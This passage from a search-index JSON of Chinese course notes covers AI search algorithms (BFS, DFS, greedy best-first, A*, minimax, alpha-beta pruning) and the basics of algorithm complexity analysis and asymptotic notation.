\u5305\u62ec\u5f53\u524d\u6e38\u620f\u5c40\u9762\u548c\u5f53\u524d\u884c\u52a8\u7684\u667a\u80fd\u4f53\uff0c\u521d\u59cb\u72b6\u6001 \\(s_0\\) \u4e3a\u6e38\u620f\u5f00\u59cb\u65f6\u7684\u72b6\u6001\u3002 \\(\\mathrm{player}(s)\\) \u8868\u793a\u72b6\u6001 \\(s\\) \u4e0b\u884c\u52a8\u7684\u667a\u80fd\u4f53 \u52a8\u4f5c\uff1a\u52a8\u4f5c\u662f\u6307 \\(\\mathrm{player}(s)\\) \u5728\u5f53\u524d\u5c40\u9762\u4e0b\u53ef\u4ee5\u91c7\u53d6\u7684\u64cd\u4f5c \\(a\\) \uff0c\u8bb0\u52a8\u4f5c\u96c6\u5408\u4e3a \\(\\mathrm{actions}(s)\\) \u72b6\u6001\u8f6c\u79fb\uff1a\u72b6\u6001\u8f6c\u79fb\u51fd\u6570 \\(s' = \\mathrm{result}(s, a)\\) \u8868\u793a\u5728\u72b6\u6001 \\(s\\) \u4e0b\u91c7\u53d6\u52a8\u4f5c \\(a\\) \u540e\u7684\u4e0b\u4e00\u4e2a\u72b6\u6001 \u7ec8\u5c40\u72b6\u6001\u6d4b\u8bd5\uff1a\u7ec8\u5c40\u72b6\u6001\u6d4b\u8bd5\u51fd\u6570 \\(\\mathrm{terminal\\_test}(s)\\) \u7528\u4e8e\u6d4b\u8bd5\u6e38\u620f\u662f\u5426\u5728\u72b6\u6001 \\(s\\) \u4e0b\u7ed3\u675f \u7ec8\u5c40\u5f97\u5206\uff1a\u7ec8\u5c40\u5f97\u5206\u51fd\u6570 \\(\\mathrm{utility}(s, p)\\) \u8868\u793a\u5728\u72b6\u6001 \\(s\\) \u4e0b\u73a9\u5bb6 \\(p\\) \u7684\u5f97\u5206 \u5bf9\u4e8e\u4e8c\u4eba\u96f6\u548c\u535a\u5f08\uff0c\u53ea\u9700\u8981\u8bb0\u5f55\u5176\u4e2d\u4e00\u4eba\u7684\u7ec8\u5c40\u5f97\u5206\u5373\u53ef \u6700\u5927\u6700\u5c0f\u641c\u7d22 \u00b6 \u6700\u5927\u6700\u5c0f\u641c\u7d22\uff08minimax search\uff09\u662f\u6c42\u89e3\u5bf9\u6297\u641c\u7d22\u95ee\u9898\u7684\u57fa\u672c\u7b97\u6cd5 \u8be5\u7b97\u6cd5\u5047\u8bbe\u4e24\u540d\u73a9\u5bb6\u5728\u51b3\u7b56\u65f6\u603b\u662f\u7406\u6027\u5730\u503e\u5411\u4e8e\u6700\u5927\u5316\u81ea\u5df1\u7684\u5f97\u5206\uff08\u6700\u5c0f\u5316\u5bf9\u65b9\u5f97\u5206\uff09 \u7b97\u6cd5\u8fc7\u7a0b \u5047\u8bbe\u4ee5\u6700\u5927\u5316\u5f97\u5206\u4e3a\u76ee\u6807\u7684\u73a9\u5bb6\u4e3a MAX\uff0c\u4ee5\u6700\u5c0f\u5316\u5f97\u5206\u4e3a\u76ee\u6807\u7684\u73a9\u5bb6\u4e3a MIN \u67d0\u4e00\u5c42\u7531 MAX \u73a9\u5bb6\u884c\u52a8\uff0c\u5219\u5176\u4f1a\u9009\u62e9\u5f97\u5206\u6700\u5927\u7684\u5b50\u6811\u8fdb\u884c\u884c\u52a8 \u67d0\u4e00\u5c42\u7531 MIN \u73a9\u5bb6\u884c\u52a8\uff0c\u5219\u5176\u4f1a\u9009\u62e9\u5f97\u5206\u6700\u5c0f\u7684\u5b50\u6811\u8fdb\u884c\u884c\u52a8 \u9012\u5f52\u5730\u8fdb\u884c\u4e0a\u8ff0\u8fc7\u7a0b\uff0c\u76f4\u5230\u8fbe\u5230\u7ec8\u5c40\u72b6\u6001 \uff08\u5b50\u6811\u7684\u5f97\u5206\u7531\u6240\u6709\u5b83\u7684\u5b50\u6811\u7684\u5f97\u5206\u53d6\u6700\u5927\u6216\u6700\u5c0f\u5f97\u5230\uff09 \\[ \\mathrm{minimax}(s) = \\begin{cases} \\mathrm{utility}(s) & \\text{if terminal\\_test(}s\\text{)} \\\\ \\max_{a \\in \\mathrm{actions}(s)} \\mathrm{minimax}(\\mathrm{result}(s, a)) & \\text{if player(}s\\text{) = MAX} \\\\ \\min_{a \\in \\mathrm{actions}(s)} \\mathrm{minimax}(\\mathrm{result}(s, a)) & \\text{if player(}s\\text{) = MIN} \\end{cases} \\] \u6700\u5927\u6700\u5c0f\u641c\u7d22\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(b^m)\\) \uff0c\u7a7a\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(bm)\\) Alpha-Beta \u526a\u679d \u00b6 \u5982\u679c\u641c\u7d22\u6811\u6781\u5927\uff0c\u5219\u6700\u5927\u6700\u5c0f\u641c\u7d22\u7684\u5f00\u9500\u5de8\u5927\uff0c\u65e0\u6cd5\u5728\u5408\u7406\u65f6\u95f4\u5185\u8fd4\u56de\u7ed3\u679c Alpha-Beta \u526a\u679d\u7b97\u6cd5\u7684\u601d\u60f3\u5982\u4e0b\uff1a \\[ \\begin{align*} \\mathrm{minimax}(s_0) &= \\max(\\min(3, 9, 10), \\min(2, x, y), \\min(10, 5, 1))\\\\ &= \\max(3, \\min(2, x, y), 1) \\end{align*} \\] \u4e0a\u5f0f\u4e2d \\(\\min(2, x, y)\\) \u80af\u5b9a\u5c0f\u4e8e 2\uff0c\u800c\u5916\u9762\u4e00\u5c42\u6c42\u6700\u5927\u503c\u53c8\u6709 3 \u6bd4\u5b83\u5927 \u6240\u4ee5\u5c31\u6ca1\u6709\u5fc5\u8981\u53bb\u641c\u7d22 \\(x, y\\) \u5bf9\u5e94\u7684\u5b50\u6811\u5f97\u5230\u5177\u4f53\u7684 \\(x, y\\) \u503c\uff0c\u53ef\u4ee5\u5c06\u8fd9\u4e24\u4e2a\u52a8\u4f5c\u526a\u679d\u6389","title":"\u641c\u7d22\u6c42\u89e3"},{"location":"cs/ai/basic/topic2/#_1","text":"Abstract \u4eba\u5de5\u667a\u80fd\u57fa\u7840\u7b2c 5 \u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a \u300a\u4eba\u5de5\u667a\u80fd\u5bfc\u8bba\uff1a\u6a21\u578b\u4e0e\u7b97\u6cd5\u300b- \u5434\u98de","title":"\u641c\u7d22\u6c42\u89e3"},{"location":"cs/ai/basic/topic2/#_2","text":"\u8bc4\u4ef7\u6307\u6807 \u5b8c\u5907\u6027\uff1a\u80fd\u5426\u627e\u5230\u89e3\uff08\u4e0d\u4e00\u5b9a\u6700\u4f18\uff09 \u6700\u4f18\u6027\uff1a\u80fd\u5426\u4fdd\u8bc1\u627e\u5230\u7684\u7b2c\u4e00\u4e2a\u89e3\u662f\u6700\u4f18\u89e3 \u65f6\u95f4\u590d\u6742\u5ea6\uff08\u901a\u8fc7\u6269\u5c55\u7684\u7ed3\u70b9\u6570\u91cf\u8861\u91cf\uff09 \u7a7a\u95f4\u590d\u6742\u5ea6\uff08\u901a\u8fc7\u540c\u65f6\u8bb0\u5f55\u7684\u7ed3\u70b9\u6570\u91cf\u8861\u91cf\uff09 \u641c\u7d22\u7b97\u6cd5\u6846\u67b6 F <- {\u6839\u8282\u70b9} while F != \u2205 do n <- pick_from(F) F <- F - {n} if goal_test(n) then return n.path end F <- F \u222a successor_nodes(n) end pick_from \u51b3\u5b9a\u6269\u5c55\u7ed3\u70b9\u7684\u987a\u5e8f\uff0csuccessor_nodes \u51b3\u5b9a\u54ea\u4e9b\u8282\u70b9\u53ef\u88ab\u653e\u5165\u8fb9\u7f18\u96c6\u5408\uff08fringe set\uff0c\u4e5f\u53eb\u5f00\u8868\uff0copen list\uff09\u4ee5\u5728\u540e\u9762\u6269\u5c55\uff08expand\uff09 \u6bcf\u6b21\u4ece\u8fb9\u7f18\u96c6\u5408\u4e2d\u53d6\u51fa\u6700\u4e0a\u5c42\uff08\u6700\u6d45\uff09\u7684\u7ed3\u70b9\u65f6\u662f\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\uff08breadth first search\uff0cBFS\uff09 \u6bcf\u6b21\u4ece\u8fb9\u7f18\u96c6\u5408\u4e2d\u53d6\u51fa\u6700\u4e0b\u5c42\uff08\u6700\u6df1\uff09\u7684\u7ed3\u70b9\u65f6\u662f\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\uff08depth first search\uff0cDFS\uff09 \u653e\u5f03\u6269\u5c55\u90e8\u5206\u7ed3\u70b9\u7684\u505a\u6cd5\u79f0\u4e3a\u526a\u679d\uff08pruning\uff09","title":"\u641c\u7d22\u7b97\u6cd5\u57fa\u7840"},{"location":"cs/ai/basic/topic2/#_3","text":"\u5229\u7528\u4e00\u4e9b\u80fd\u591f\u8f85\u52a9\u7b97\u6cd5\u505a\u51fa\u51b3\u7b56\u7684\u989d\u5916\u4fe1\u606f\u7684\u641c\u7d22\u7b97\u6cd5\u79f0\u4e3a\u542f\u53d1\u5f0f\u641c\u7d22\uff08heuristic search\uff09\uff0c\u6216\u6709\u4fe1\u606f\u641c\u7d22\uff08informed search\uff09 \u63d0\u4f9b\u7684\u8fd9\u4e9b\u8f85\u52a9\u4fe1\u606f\u79f0\u4e3a\u542f\u53d1\u4fe1\u606f \u542f\u53d1\u4fe1\u606f\u901a\u5e38\u5f62\u5f0f\u5316\u4e3a\u4e00\u4e2a\u5173\u4e8e\u7ed3\u70b9\u7684\u51fd\u6570 \\(h(n)\\) \uff0c\u5176\u7528\u4e8e\u4f30\u8ba1\u7ed3\u70b9 \\(n\\) \u8ddd\u79bb\u8fbe\u5230\u76ee\u6807\u8fd8\u9700\u4ed8\u51fa\u591a\u5c11\u4ee3\u4ef7\uff0c\u8fd9\u4e2a\u51fd\u6570\u79f0\u4e3a\u542f\u53d1\u51fd\u6570\uff08heuristic function\uff09 \u542f\u53d1\u51fd\u6570\u901a\u5e38\u662f\u975e\u8d1f\u7684 \u5e38\u89c1\u7528\u6cd5\u662f\u7528\u6765\u66f4\u6539\u524d\u9762\u7684 pick_from \u51fd\u6570\u6765\u89c4\u5b9a\u6311\u9009\u7ed3\u70b9\u7684\u987a\u5e8f \u5bf9\u4e8e\u4efb\u610f\u7ed3\u70b9 \\(n\\) \uff0c\u51b3\u5b9a\u4e86\u641c\u7d22\u7b97\u6cd5\u6269\u5c55\u7ed3\u70b9 \\(n\\) \u7684\u4f18\u5148\u5ea6\u7684\u51fd\u6570 \\(f(n)\\) \u79f0\u4e3a\u8bc4\u4ef7\u51fd\u6570\uff08evaluation function\uff09 \u8bc4\u4ef7\u51fd\u6570\u503c\u8d8a\u5c0f\uff0c\u88ab\u6311\u9009\u7684\u4f18\u5148\u7ea7\u8d8a\u9ad8 \u6df1\u5ea6\u4f18\u5148\u641c\u7d22\u4e2d \\(f(n)\\) \u53ef\u88ab\u5b9a\u4e49\u4e3a\u8be5\u7ed3\u70b9\u6df1\u5ea6\u7684\u5012\u6570 \u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\u4e2d \\(f(n)\\) \u53ef\u88ab\u5b9a\u4e49\u4e3a\u8be5\u7ed3\u70b9\u6df1\u5ea6","title":"\u542f\u53d1\u5f0f\u641c\u7d22"},{"location":"cs/ai/basic/topic2/#_4","text":"\u5373 greedy best-first search\uff0cGBFS \u4f18\u5148\u6269\u5c55\u8ddd\u79bb\u76ee\u6807\u8fd1\u7684\u7ed3\u70b9\uff0c\u5373\u4ee4 \\(f(n) = h(n)\\) \u4e0d\u6392\u9664\u73af\u8def\u7684\u8d2a\u5a6a\u6700\u4f73\u4f18\u5148\u641c\u7d22\u7b97\u6cd5\u662f\u4e0d\u5b8c\u5907\u7684 \u6392\u9664\u73af\u8def\u7684\u8d2a\u5a6a\u6700\u4f73\u4f18\u5148\u641c\u7d22\u662f\u5b8c\u5907\u7684\uff0c\u4f46\u4e0d\u4e00\u5b9a\u6700\u4f18 \u6700\u574f\u60c5\u51b5\u4e0b\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u548c\u7a7a\u95f4\u590d\u6742\u5ea6\u5747\u4e3a \\(O(b^m)\\) \\(b\\) \u4e3a\u5206\u652f\u56e0\u5b50\uff08\u6bcf\u4e2a\u7ed3\u70b9\u6700\u5927\u7684\u5206\u652f\u6570\u76ee\uff09 \\(m\\) \u4e3a\u6700\u5927\u6df1\u5ea6\uff0c\u4e5f\u5c31\u662f\u641c\u7d22\u6811\u4e2d\u8def\u5f84\u7684\u6700\u5927\u53ef\u80fd\u957f\u5ea6","title":"\u8d2a\u5a6a\u6700\u4f73\u4f18\u5148\u641c\u7d22"},{"location":"cs/ai/basic/topic2/#a","text":"\u8d2a\u5a6a\u6700\u4f73\u4f18\u5148\u641c\u7d22\u7b97\u6cd5\u7684\u95ee\u9898\u662f\u6ca1\u6709\u8003\u8651\u4ece\u521d\u59cb\u7ed3\u70b9\u5230\u6269\u5c55\u7ed3\u70b9\u6240\u9700\u7684\u4ee3\u4ef7 A* \u7b97\u6cd5\u628a\u4ece\u521d\u59cb\u7ed3\u70b9\u5230\u5f53\u524d\u7ed3\u70b9\u7684\u8def\u5f84\u4ee3\u4ef7\u5728\u8bc4\u4ef7\u51fd\u6570\u4e2d\u8fdb\u884c\u4e86\u8003\u8651 \u4ee4 \\(f(n) = g(n) + h(n)\\) \uff0c\u5176\u4e2d \\(g(n)\\) \u4e3a\u4ece\u521d\u59cb\u7ed3\u70b9\u5230\u7ed3\u70b9 \\(n\\) \u7684\u8def\u5f84\u4ee3\u4ef7 \u6bcf\u6b21\u4ece\u8fb9\u7f18\u96c6\u5408\u4e2d\u6269\u5c55\u7684\u7ed3\u70b9\u5e76\u975e\u603b\u662f\u5f53\u524d\u7ed3\u70b9\u7684\u76f8\u90bb\u540e\u7ee7\u7ed3\u70b9 \u826f\u597d\u7684\u542f\u53d1\u51fd\u6570\u9700\u8981\u6ee1\u8db3\u7684\u6027\u8d28 \u53ef\u5bb9\u6027\uff08admissible\uff09\uff1a\u5bf9\u4e8e\u4efb\u610f\u7ed3\u70b9 \\(n\\) \uff0c \\(h(n)\\) \u7684\u503c\u4e0d\u4f1a\u8d85\u8fc7\u4ece\u7ed3\u70b9 \\(n\\) \u5230\u76ee\u6807\u7ed3\u70b9\u7684\u6700\u4f73\u8def\u5f84\u4ee3\u4ef7 \u4e00\u81f4\u6027\uff08consistency\uff09\uff1a\u5bf9\u4e8e\u4efb\u610f\u7ed3\u70b9 \\(n\\) \uff0c\u5982\u679c\u4ece\u7ed3\u70b9 \\(n\\) \u5230\u76ee\u6807\u7ed3\u70b9\u7684\u6700\u4f73\u8def\u5f84\u7ecf\u8fc7\u7ed3\u70b9 \\(n'\\) \uff0c\u5219 \\(h(n) \\leq c(n, n') + h(n')\\) \uff0c\u5176\u4e2d \\(c(n, n')\\) \u4e3a\u4ece\u7ed3\u70b9 \\(n\\) \u5230\u7ed3\u70b9 \\(n'\\) \u7684\u8def\u5f84\u4ee3\u4ef7 \u6ee1\u8db3\u4e00\u81f4\u6027\u4e00\u5b9a\u6ee1\u8db3\u53ef\u5bb9\u6027 A* \u7b97\u6cd5\u5b8c\u5907\u7684\u6761\u4ef6 \u641c\u7d22\u6811\u4e2d\u5206\u652f\u6570\u91cf\u6709\u9650\uff0c\u5373\u6bcf\u4e2a\u7ed3\u70b9\u7684\u540e\u7ee7\u7ed3\u70b9\u6570\u91cf\u662f\u6709\u9650\u7684 \u5355\u6b65\u4ee3\u4ef7\u7684\u4e0b\u5c4a\u662f\u4e00\u4e2a\u6b63\u6570 \u542f\u53d1\u51fd\u6570\u6709\u4e0b\u5c4a \u542f\u53d1\u51fd\u6570\u6ee1\u8db3\u4e00\u81f4\u6027\u65f6\uff0cA* \u7b97\u6cd5\u662f\u6700\u4f18\u7684","title":"A* \u641c\u7d22"},{"location":"cs/ai/basic/topic2/#_5","text":"\u667a\u80fd\u4f53\u4e0d\u552f\u4e00\uff0c\u89e3\u51b3\u4fe1\u606f\u786e\u5b9a\u3001\u5168\u5c40\u53ef\u89c2\u5bdf\u3001\u8f6e\u6d41\u884c\u52a8\u3001\u8f93\u8d62\u6536\u76ca\u96f6\u548c\u7684\u535a\u5f08\u95ee\u9898\uff0c\u6c42\u89e3\u8fd9\u6837\u95ee\u9898\u7684\u7b97\u6cd5\u79f0\u4e3a\u5bf9\u6297\u641c\u7d22\uff08adversarial search\uff09\u6216\u535a\u5f08\u641c\u7d22\uff08game search\uff09 \u667a\u80fd\u4f53\u4f1a\u9009\u62e9\u6700\u5927\u5316\u81ea\u8eab\u5229\u76ca\u3001\u6700\u5c0f\u5316\u5bf9\u624b\u5229\u76ca\u7684\u7b56\u7565 \u5f62\u5f0f\u5316\u63cf\u8ff0\uff1a \u72b6\u6001\uff1a\u72b6\u6001 \\(s\\) \u5305\u62ec\u5f53\u524d\u6e38\u620f\u5c40\u9762\u548c\u5f53\u524d\u884c\u52a8\u7684\u667a\u80fd\u4f53\uff0c\u521d\u59cb\u72b6\u6001 \\(s_0\\) \u4e3a\u6e38\u620f\u5f00\u59cb\u65f6\u7684\u72b6\u6001\u3002 \\(\\mathrm{player}(s)\\) \u8868\u793a\u72b6\u6001 \\(s\\) \u4e0b\u884c\u52a8\u7684\u667a\u80fd\u4f53 \u52a8\u4f5c\uff1a\u52a8\u4f5c\u662f\u6307 \\(\\mathrm{player}(s)\\) \u5728\u5f53\u524d\u5c40\u9762\u4e0b\u53ef\u4ee5\u91c7\u53d6\u7684\u64cd\u4f5c \\(a\\) \uff0c\u8bb0\u52a8\u4f5c\u96c6\u5408\u4e3a \\(\\mathrm{actions}(s)\\) \u72b6\u6001\u8f6c\u79fb\uff1a\u72b6\u6001\u8f6c\u79fb\u51fd\u6570 \\(s' = \\mathrm{result}(s, a)\\) \u8868\u793a\u5728\u72b6\u6001 \\(s\\) \u4e0b\u91c7\u53d6\u52a8\u4f5c \\(a\\) \u540e\u7684\u4e0b\u4e00\u4e2a\u72b6\u6001 \u7ec8\u5c40\u72b6\u6001\u6d4b\u8bd5\uff1a\u7ec8\u5c40\u72b6\u6001\u6d4b\u8bd5\u51fd\u6570 \\(\\mathrm{terminal\\_test}(s)\\) \u7528\u4e8e\u6d4b\u8bd5\u6e38\u620f\u662f\u5426\u5728\u72b6\u6001 \\(s\\) \u4e0b\u7ed3\u675f \u7ec8\u5c40\u5f97\u5206\uff1a\u7ec8\u5c40\u5f97\u5206\u51fd\u6570 \\(\\mathrm{utility}(s, p)\\) \u8868\u793a\u5728\u72b6\u6001 \\(s\\) \u4e0b\u73a9\u5bb6 \\(p\\) \u7684\u5f97\u5206 \u5bf9\u4e8e\u4e8c\u4eba\u96f6\u548c\u535a\u5f08\uff0c\u53ea\u9700\u8981\u8bb0\u5f55\u5176\u4e2d\u4e00\u4eba\u7684\u7ec8\u5c40\u5f97\u5206\u5373\u53ef","title":"\u5bf9\u6297\u641c\u7d22"},{"location":"cs/ai/basic/topic2/#_6","text":"\u6700\u5927\u6700\u5c0f\u641c\u7d22\uff08minimax search\uff09\u662f\u6c42\u89e3\u5bf9\u6297\u641c\u7d22\u95ee\u9898\u7684\u57fa\u672c\u7b97\u6cd5 \u8be5\u7b97\u6cd5\u5047\u8bbe\u4e24\u540d\u73a9\u5bb6\u5728\u51b3\u7b56\u65f6\u603b\u662f\u7406\u6027\u5730\u503e\u5411\u4e8e\u6700\u5927\u5316\u81ea\u5df1\u7684\u5f97\u5206\uff08\u6700\u5c0f\u5316\u5bf9\u65b9\u5f97\u5206\uff09 \u7b97\u6cd5\u8fc7\u7a0b \u5047\u8bbe\u4ee5\u6700\u5927\u5316\u5f97\u5206\u4e3a\u76ee\u6807\u7684\u73a9\u5bb6\u4e3a MAX\uff0c\u4ee5\u6700\u5c0f\u5316\u5f97\u5206\u4e3a\u76ee\u6807\u7684\u73a9\u5bb6\u4e3a MIN \u67d0\u4e00\u5c42\u7531 MAX \u73a9\u5bb6\u884c\u52a8\uff0c\u5219\u5176\u4f1a\u9009\u62e9\u5f97\u5206\u6700\u5927\u7684\u5b50\u6811\u8fdb\u884c\u884c\u52a8 \u67d0\u4e00\u5c42\u7531 MIN \u73a9\u5bb6\u884c\u52a8\uff0c\u5219\u5176\u4f1a\u9009\u62e9\u5f97\u5206\u6700\u5c0f\u7684\u5b50\u6811\u8fdb\u884c\u884c\u52a8 \u9012\u5f52\u5730\u8fdb\u884c\u4e0a\u8ff0\u8fc7\u7a0b\uff0c\u76f4\u5230\u8fbe\u5230\u7ec8\u5c40\u72b6\u6001 \uff08\u5b50\u6811\u7684\u5f97\u5206\u7531\u6240\u6709\u5b83\u7684\u5b50\u6811\u7684\u5f97\u5206\u53d6\u6700\u5927\u6216\u6700\u5c0f\u5f97\u5230\uff09 \\[ \\mathrm{minimax}(s) = \\begin{cases} \\mathrm{utility}(s) & \\text{if terminal\\_test(}s\\text{)} \\\\ \\max_{a \\in \\mathrm{actions}(s)} \\mathrm{minimax}(\\mathrm{result}(s, a)) & \\text{if player(}s\\text{) = MAX} \\\\ \\min_{a \\in \\mathrm{actions}(s)} \\mathrm{minimax}(\\mathrm{result}(s, a)) & \\text{if player(}s\\text{) = MIN} \\end{cases} \\] \u6700\u5927\u6700\u5c0f\u641c\u7d22\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(b^m)\\) \uff0c\u7a7a\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(bm)\\)","title":"\u6700\u5927\u6700\u5c0f\u641c\u7d22"},{"location":"cs/ai/basic/topic2/#alpha-beta","text":"\u5982\u679c\u641c\u7d22\u6811\u6781\u5927\uff0c\u5219\u6700\u5927\u6700\u5c0f\u641c\u7d22\u7684\u5f00\u9500\u5de8\u5927\uff0c\u65e0\u6cd5\u5728\u5408\u7406\u65f6\u95f4\u5185\u8fd4\u56de\u7ed3\u679c Alpha-Beta \u526a\u679d\u7b97\u6cd5\u7684\u601d\u60f3\u5982\u4e0b\uff1a \\[ \\begin{align*} \\mathrm{minimax}(s_0) &= \\max(\\min(3, 9, 10), \\min(2, x, y), \\min(10, 5, 1))\\\\ &= \\max(3, \\min(2, x, y), 1) \\end{align*} \\] \u4e0a\u5f0f\u4e2d \\(\\min(2, x, y)\\) \u80af\u5b9a\u5c0f\u4e8e 2\uff0c\u800c\u5916\u9762\u4e00\u5c42\u6c42\u6700\u5927\u503c\u53c8\u6709 3 \u6bd4\u5b83\u5927 \u6240\u4ee5\u5c31\u6ca1\u6709\u5fc5\u8981\u53bb\u641c\u7d22 \\(x, y\\) \u5bf9\u5e94\u7684\u5b50\u6811\u5f97\u5230\u5177\u4f53\u7684 \\(x, y\\) \u503c\uff0c\u53ef\u4ee5\u5c06\u8fd9\u4e24\u4e2a\u52a8\u4f5c\u526a\u679d\u6389","title":"Alpha-Beta \u526a\u679d"},{"location":"cs/algorithm/ds/","text":"\u6570\u636e\u7ed3\u6784\u57fa\u7840 \u00b6 Abstract \u6d59\u6c5f\u5927\u5b66 \u201c\u6570\u636e\u7ed3\u6784\u57fa\u7840\u201d \u8bfe\u7a0b\u53ca\u76f8\u5173\u77e5\u8bc6\u7b14\u8bb0 Table of Contents \u00b6","title":"\u6570\u636e\u7ed3\u6784\u57fa\u7840"},{"location":"cs/algorithm/ds/#_1","text":"Abstract \u6d59\u6c5f\u5927\u5b66 \u201c\u6570\u636e\u7ed3\u6784\u57fa\u7840\u201d \u8bfe\u7a0b\u53ca\u76f8\u5173\u77e5\u8bc6\u7b14\u8bb0","title":"\u6570\u636e\u7ed3\u6784\u57fa\u7840"},{"location":"cs/algorithm/ds/#table-of-contents","text":"","title":"Table of Contents"},{"location":"cs/algorithm/ds/topic1/","text":"\u7b97\u6cd5\u5206\u6790\u57fa\u7840 \u00b6 Abstract \u6570\u636e\u7ed3\u6784\u57fa\u7840\u7b2c 1 \u81f3 2 \u5468\u8bfe\u7a0b\u5185\u5bb9 \u7b97\u6cd5\u4e0e\u5206\u6790 \u00b6 \u4e00\u4e2a\u5b9a\u4e49\u597d\u7684\u3001\u8ba1\u7b97\u673a\u53ef\u6267\u884c\u7684\u3001\u89e3\u51b3\u67d0\u4e00\u95ee\u9898\u7684\u6709\u9650\u6b65\u9aa4 \u9700\u8981\u6709\u4ee5\u4e0b\u7279\u5f81\uff1a Input Output Definiteness Finiteness Effectiveness program \u4e0d\u9700\u8981 finite\uff08\u6bd4\u5982\u64cd\u4f5c\u7cfb\u7edf\uff09 \u7b97\u6cd5\u5206\u6790\u5185\u5bb9\uff1a \u8fd0\u884c\u65f6\u95f4\uff1a\u4e0e\u673a\u5668\u548c\u7f16\u8bd1\u5668\u6709\u5173 \u65f6\u95f4\u590d\u6742\u5ea6\u3001\u7a7a\u95f4\u590d\u6742\u5ea6\uff1a\u4e0e\u673a\u5668\u548c\u7f16\u8bd1\u5668\u65e0\u5173 \u590d\u6742\u5ea6\u5206\u6790\u5047\u8bbe \u6307\u4ee4\u6309\u987a\u5e8f\u6267\u884c \u6240\u6709\u6307\u4ee4\uff08\u8fd0\u7b97\uff09\u90fd\u6d88\u8017\u540c\u4e00\u65f6\u95f4\u5355\u5143 \u6570\u636e\u89c4\u6a21\u662f\u7ed9\u5b9a\u7684\uff0c\u4e14\u6709\u65e0\u9650\u7a7a\u95f4 \u4e00\u822c\u9700\u8981\u5206\u6790 \\(T_{\\mathrm{avg}}(N)\\) \uff08\u5e73\u5747\u60c5\u51b5\uff09\u548c \\(T_{\\mathrm{worst}}(N)\\) \uff08\u6700\u5dee\u60c5\u51b5\uff09\uff0c \\(N\\) \u662f\u8f93\u5165\u7684\u6570\u636e\u89c4\u6a21\uff08\u4e5f\u53ef\u4ee5\u6709\u591a\u4e2a\u8f93\u5165\u89c4\u6a21\uff09 \u590d\u6742\u5ea6\u6e10\u8fdb\u8bb0\u53f7 \u00b6 \u5b9a\u4e49 \u00b6 \u5927 \\(O\\) \u8868\u793a\u6cd5 \\(T(N) = O(f(N))\\) \uff0c\u5982\u679c\u5b58\u5728\u5e38\u6570 \\(c\\) \u548c \\(n_0\\) \u4f7f\u5f97\u5f53 \\(N\\geq n_0\\) \u65f6 \\(T(N)\\leq c\\cdot f(N)\\) \u6e10\u8fdb\u4e0a\u754c\uff0c\u5373 \\(T(N)\\) \u7684\u9636\u4e0d\u4f1a\u9ad8\u4e8e \\(f(N)\\) \uff08\u589e\u957f\u6bd4 \\(f(N)\\) \u6162\u6216\u76f8\u540c\uff0c<=\uff09 \u5927 \\(\\Omega\\) \u8868\u793a\u6cd5 \\(T(N) = \\Omega(g(N))\\) \uff0c\u5982\u679c\u5b58\u5728\u5e38\u6570 \\(c\\) \u548c \\(n_0\\) \u4f7f\u5f97\u5f53 \\(N\\geq n_0\\) \u65f6 \\(T(N)\\geq c\\cdot g(N)\\) \u6e10\u8fdb\u4e0b\u754c\uff0c\u5373 \\(T(N)\\) \u7684\u9636\u4e0d\u4f1a\u4f4e\u4e8e \\(f(N)\\) \uff08\u589e\u957f\u6bd4 \\(f(N)\\) \u5feb\u6216\u76f8\u540c\uff0c>=\uff09 \u5927 \\(\\Theta\\) \u8868\u793a\u6cd5 \\(T(N) = \\Theta(h(N))\\) \uff0c\u5f53\u4e14\u4ec5\u5f53 \\(T(N) = O(h(N))\\) \u4e14 \\(T(N) = \\Omega(h(N))\\) \u6e10\u8fdb\u7d27\u786e\u754c\uff0c\u5373 \\(T(N)\\) \u9700\u8981\u4e0e \\(h(N)\\) \u540c\u9636\uff08\u589e\u957f\u901f\u5ea6\u76f8\u540c =\uff09 \u5c0f \\(o\\) \u8868\u793a\u6cd5 \\(T(N) = o(p(N))\\) \uff0c\u5f53 \\(T(N) = O(p(N))\\) \u4e14 \\(T(N)\\ne \\Theta(p(N))\\) \u65f6 \u975e\u6e10\u8fdb\u7d27\u786e\u4e0a\u754c\uff08 \\(T(N)\\) \u589e\u957f\u6bd4 \\(p(N)\\) \u6162\uff0c<\uff09 \u5c0f \\(\\omega\\) \u8868\u793a\u6cd5 \\(T(N) = \\omega(p(N))\\) \uff0c\u5f53 \\(T(N) = \\Omega(q(N))\\) \u4e14 \\(T(N)\\ne \\Theta(q(N))\\) \u65f6 \u975e\u6e10\u8fdb\u7d27\u786e\u4e0b\u754c\uff08 \\(T(N)\\) \u589e\u957f\u6bd4 \\(q(N)\\) \u5feb\uff0c>\uff09 \u89c4\u5219 \u00b6 \u5982\u679c \\(T_1(N) = O(f(N))\\) \u4e14 \\(T_2(N) = O(g(N))\\) \uff0c\u5219\uff1a \\(T_1(N) + T_2(N) = \\mathrm{max}(O(f(N)), O(g(N)))\\) \\(T_1(N)\\cdot T_2(N) = O(f(N)\\cdot g(N))\\) \u5982\u679c \\(T(N)\\) \u662f \\(N\\) \u7684 \\(k\\) \u6b21\u591a\u9879\u5f0f\uff0c\u5219 \\(T(N) = \\Theta(N^k)\\) \u5bf9\u4e8e\u4efb\u610f\u5e38\u6570 \\(k\\) \u5747\u6709 \\(\\log^kN = O(N)\\) \u5927 O \u8bb0\u53f7\u6bd4\u8f83\uff1a Big O Cheat Sheet \u5206\u6790\u89c4\u5219\uff1a for \u5faa\u73af\u7684\u8fd0\u884c\u65f6\u95f4\u662f\u5faa\u73af\u5185\u90e8\u8bed\u53e5\u7684\u6700\u957f\u65f6\u95f4\uff08\u542b for \u5224\u65ad\uff09\u4e58\u5faa\u73af\u6b21\u6570 \u5d4c\u5957 for \u5faa\u73af\u8981\u9010\u6b21\u76f8\u4e58 if else \u8bed\u53e5\u7684\u8fd0\u884c\u65f6\u95f4\u4e0d\u8d85\u8fc7\u5224\u65ad\u65f6\u95f4+\u8017\u65f6\u6700\u957f\u7684\u8bed\u53e5\u5757\u7684\u8fd0\u884c\u65f6\u95f4 \u8865\u5145\uff1a\u4e3b\u5b9a\u7406\u3002\u5047\u8bbe\u6709 